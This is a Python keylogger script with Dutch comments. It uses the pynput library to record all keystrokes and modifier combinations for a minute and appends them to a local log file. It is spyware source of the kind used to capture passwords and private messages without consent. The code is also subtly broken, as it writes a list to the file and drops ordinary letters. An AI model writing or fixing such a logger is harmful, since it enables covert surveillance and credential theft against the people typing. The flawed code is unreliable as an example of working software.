import time
from pynput import keyboard

SPECIALE_KEYS = {
    "Key.space": " ",
    "Key.enter": "[ENTER]\n",
    "Key.backspace": "[BACKSPACE]",
    "Key.shift": "[SHIFT]",
    "Key.ctrl": "[CTRL]",
    "Key.alt": "[ALT]",
    "Key.tab": "[TAB]",
    "Key.esc": "[ESC]"
}

MOD_KEYS = [
    "Key.shift",
    "Key.ctrl",
    "Key.alt"
]

mods = set()
buffer = []
BUF_GROOTTE = 20
FLUSH_TIJD = 5
MAX_TIJD = 60
start = time.time()


def save(log_file_name: str = "log.txt") -> str:
    """ Schrijft de buffer naar een logfile """
    try:
        if buffer:
            with open(log_file_name, "a") as file:
                file.write(buffer)
            buffer.clear()
            return f"bestand opgeslagen als: {log_file_name}"
    except Exception as e:
        return f"Er ging iets mis: {e}"


def on_keypress(toets):
    try:
        toets_str = str(toets).replace("'", "")
        if toets_str in MOD_KEYS:
            mods.add(toets_str)
        else:
            log_input(toets_str)
    except Exception as e:
        print(f"error: {e}")


def on_release(toets):
    try:
        mods.discard(str(toets).replace("'", ""))
        if time.time() - start < MAX_TIJD:
            save()

    except Exception as e:
        print(f"error: {e}")


def log_input(toets):
    try:
        t = SPECIALE_KEYS.get(str(toets[1:-1]))
        if mods:
            t = "+".join(sorted(mods)) + f"+{t}"
        buffer.append(t)
        if len(buffer) >= BUF_GROOTTE:
            save()
    except Exception as e:
        print(f"er ging iets mis: {e}")


def start_logger():
    with keyboard.Listener(on_press=on_keypress, on_release=on_release):
        try:
            while time.time() - start < MAX_TIJD:
                time.sleep(FLUSH_TIJD)
                save()

        except KeyboardInterrupt:
            save()

        except Exception as e:
            print(f'error: {e}')


if __name__ == "__main__":
    start_logger()
